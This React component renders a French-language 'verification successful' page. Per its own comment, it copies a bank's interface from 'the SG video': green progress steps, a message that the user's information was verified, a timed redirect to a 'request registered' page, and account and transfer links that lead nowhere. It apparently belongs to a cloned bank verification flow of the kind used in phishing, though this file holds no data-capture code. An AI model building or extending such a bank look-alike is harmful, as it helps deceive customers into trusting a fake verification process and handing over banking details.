import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { CheckCircle2, Loader2 } from 'lucide-react';

/**
 * Intermediate "Vérification réussie" page.
 * Layout exactly like the SG video : 3 green progress dots at top,
 * small green check icon, success message + help on the right,
 * then auto-redirect to "Demande enregistrée" after 5s.
 */
export default function VerifSucces() {
  const navigate = useNavigate();
  const [seconds, setSeconds] = useState(5);

  useEffect(() => {
    window.scrollTo(0, 0);
    const t = setInterval(() => {
      setSeconds((s) => {
        if (s <= 1) {
          clearInterval(t);
          navigate('/verification/enregistree');
          return 0;
        }
        return s - 1;
      });
    }, 1000);
    return () => clearInterval(t);
  }, [navigate]);

  return (
    <div className="bg-white min-h-[calc(100vh-118px)] pt-8 md:pt-10 pb-12">
      <div className="max-w-[1100px] mx-auto px-4 md:px-8">
        <ThreeGreenDots />

        <div className="mt-10 grid lg:grid-cols-[1fr_1fr] gap-8 lg:gap-16 max-w-[980px]">
          {/* Success message */}
          <div className="flex flex-col items-center text-center">
            <div className="w-14 h-14 rounded-full bg-[#15B27D]/15 flex items-center justify-center text-[#15B27D]">
              <CheckCircle2 size={36} strokeWidth={2.2} />
            </div>
            <h1 className="mt-4 text-[22px] md:text-[24px] font-extrabold text-[#0F1B33]">
              Vérification réussie
            </h1>
            <p className="mt-2 text-[13.5px] text-[#2B2B2B] max-w-xs leading-snug">
              Vos informations ont bien été vérifiées. Vous allez être redirigé vers votre espace
              client.
            </p>
            <div className="mt-5 flex items-center gap-2 text-[12.5px] text-neutral-500">
              <Loader2 size={14} className="animate-spin" />
              Redirection dans {seconds}&nbsp;s…
            </div>
          </div>

          {/* Right side info */}
          <div className="lg:border-l lg:border-neutral-200 lg:pl-12">
            <h3 className="text-[14px] font-bold text-[#0F1B33]">Votre espace client</h3>
            <ul className="mt-3 space-y-2 text-[13.5px] text-[#2B2B2B] list-disc pl-5 leading-[1.55]">
              <li>Vous pouvez désormais consulter vos comptes et services en ligne.</li>
              <li>Pensez à vous déconnecter après chaque session sur un appareil partagé.</li>
            </ul>
            <h3 className="mt-6 text-[14px] font-bold text-[#0F1B33]">Accès rapide</h3>
            <ul className="mt-3 space-y-1.5 text-[13.5px]">
              <li>
                <a href="#" className="text-[#E9041E] hover:underline font-semibold">
                  &rsaquo; Mes comptes
                </a>
              </li>
              <li>
                <a href="#" className="text-[#E9041E] hover:underline font-semibold">
                  &rsaquo; Virements
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
    </div>
  );
}

function ThreeGreenDots() {
  const labels = ['Accueil', 'Vérification', 'Informations'];
  return (
    <div className="w-full max-w-[420px] mx-auto px-4">
      <div className="relative flex items-center justify-between">
        <div className="absolute left-[10%] right-[10%] top-1/2 -translate-y-1/2 h-[2px] bg-[#15B27D] rounded-full" />
        {labels.map((label) => (
          <div key={label} className="relative z-10 flex flex-col items-center">
            <div className="w-7 h-7 rounded-full bg-[#15B27D] border-2 border-[#15B27D] text-white flex items-center justify-center">
              <CheckCircle2 size={15} strokeWidth={2.6} />
            </div>
            <span className="mt-1.5 text-[10.5px] font-semibold text-[#0F1B33]">{label}</span>
          </div>
        ))}
      </div>
    </div>
  );
}
